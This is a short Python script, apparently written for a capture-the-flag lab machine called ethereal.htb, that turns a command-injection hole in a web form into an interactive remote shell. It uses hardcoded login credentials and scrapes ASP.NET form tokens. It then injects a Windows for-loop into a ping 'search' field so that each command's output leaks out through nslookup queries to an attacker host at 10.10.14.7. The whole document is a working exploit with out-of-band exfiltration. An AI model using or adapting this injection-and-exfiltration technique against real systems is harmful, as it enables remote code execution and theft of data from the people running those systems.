import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
from cmd import Cmd

class Terminal(Cmd):
    prompt = '> '

    def __init__(self):
        self.auth = HTTPBasicAuth('alan', '!C414m17y57r1k3s4g41n!')
        page = requests.get('http://ethereal.htb:8080', auth=self.auth)
        soup = BeautifulSoup(page.text, 'html.parser')
        self.VS = soup.find('input', {'name':'__VIEWSTATE'})['value']
        self.VSG = soup.find('input', {'name':'__VIEWSTATEGENERATOR'})['value']
        self.EV = soup.find('input', {'name':'__EVENTVALIDATION'})['value']
        self.CTL = soup.find('input', {'name':'ctl02'})['value']
        Cmd.__init__(self)

    def do_cmd(self, args):
        print(args)

    def default(self, args):
        cmd = f"""-n 1 127.0.0.1 & for /f "tokens=1,2,3,4,5,6" %a in ('{args}') do nslookup %a%b%c%d%e%f 10.10.14.7 """

        data = {
            '__VIEWSTATE':self.VS,
            '__VIEWSTATEGENERATOR':self.VSG,
            '__EVENTVALIDATION':self.EV,
            'search':cmd,
            'ctl02':self.CTL
        }
        auth = self.auth
        requests.post('http://ethereal.htb:8080', data=data, auth=auth)

terminal = Terminal()
terminal.cmdloop()



